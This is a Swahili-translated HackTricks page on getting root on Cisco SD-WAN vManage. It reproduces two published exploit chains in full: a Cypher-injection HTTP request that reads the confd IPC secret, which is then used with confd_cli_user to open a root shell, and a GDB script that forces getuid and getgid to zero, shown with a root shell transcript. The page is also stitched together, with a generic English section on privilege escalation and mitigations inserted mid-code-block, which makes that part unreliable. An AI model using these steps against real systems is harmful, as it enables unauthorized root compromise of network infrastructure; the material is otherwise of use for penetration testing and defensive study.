# Cisco - vmanage

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Njia 1

(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchunguza kidogo kupitia [nyaraka](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na programu za binary tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kuwa ili kuthibitisha soketi ya IPC, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka kifaa chetu cha Neo4j? Inaendeshwa chini ya mamlaka ya mtumiaji 'vmanage', hivyo kuturuhusu kupata faili kwa kutumia udhaifu uliopita:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haiungi mkono hoja za mstari wa amri lakini inaita `/usr/bin/confd_cli_user` na hoja. Kwa hivyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu ya hoja. Hata hivyo, haionekani kwa urahisi na mamlaka yetu ya sasa, kwa hivyo tunapaswa kuipata kutoka kwenye rootfs na kuikopy kupitia scp, kusoma msaada, na kuitumia ili kupata kikao cha amri:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia 2

(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blogi¹ ya timu ya synacktiv ilielezea njia nzuri ya kupata kikao cha root, lakini shida ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kuongeza hadi kwa root bila usumbufu kama huo.

Nilipovunja vipande vipande faili ya `/usr/bin/confd_cli`, niliona yafuatayo:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
Nilipokimbia "ps aux", niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilidhani programu ya "confd_cli" inapitisha kitambulisho cha mtumiaji na kikundi ambacho kilikusanywa kutoka kwa mtumiaji aliyeingia kwenye programu ya "cmdptywrapper".

Jaribio langu la kwanza lilikuwa kukimbia moja kwa moja programu ya "cmdptywrapper" na kuiwezesha na `-g 0 -u 0`, lakini lilishindikana. Inaonekana kuna kitambulisho cha faili (-i 1015) kilichoundwa mahali fulani njiani na siwezi kukidanganya.

Kama ilivyotajwa katika blogu ya synacktiv (mfano wa mwisho), programu ya `confd_cli` haikubali vigezo vya amri ya mstari, lakini naweza kuathiri kwa kutumia kisakuzi na bahati nzuri GDB imejumuishwa kwenye mfumo.

Niliumba skripti ya GDB ambapo nililazimisha API ya `getuid` na `getgid` kurudisha 0. Tangu tayari nina ruhusa ya "vmanage" kupitia RCE ya deserialization, nina idhini ya kusoma moja kwa moja `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
# Cisco vManage

## Description

Cisco vManage is a cloud-based network management platform that provides centralized control and visibility for Cisco SD-WAN devices. It allows network administrators to monitor, configure, and troubleshoot their SD-WAN infrastructure.

## Privilege Escalation

### Exploiting Misconfigurations

#### Default Credentials

Some versions of Cisco vManage may have default credentials that can be used to gain unauthorized access. Attackers can try common default usernames and passwords to exploit this misconfiguration.

#### Weak Passwords

If weak passwords are used for the Cisco vManage platform, attackers can use brute-force or dictionary attacks to guess the password and gain unauthorized access.

### Exploiting Vulnerabilities

#### Remote Code Execution

If a vulnerability exists in the Cisco vManage platform that allows remote code execution, attackers can exploit it to execute arbitrary commands with elevated privileges.

#### SQL Injection

If the Cisco vManage platform is vulnerable to SQL injection attacks, attackers can manipulate database queries to gain unauthorized access or escalate privileges.

### Exploiting Misconfigured Permissions

If the permissions on the Cisco vManage platform are misconfigured, attackers can exploit this to gain unauthorized access or escalate privileges. This can include misconfigured file or directory permissions, allowing attackers to read, write, or execute files they shouldn't have access to.

## Mitigation

To mitigate privilege escalation risks in Cisco vManage, follow these best practices:

- Change default credentials immediately after installation.
- Use strong passwords that are resistant to brute-force or dictionary attacks.
- Regularly update the Cisco vManage platform to patch any known vulnerabilities.
- Implement proper access controls and permissions to prevent unauthorized access.
- Regularly review and audit the configuration of Cisco vManage to identify and fix any misconfigurations.

By following these best practices, you can reduce the risk of privilege escalation attacks on your Cisco vManage platform.
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
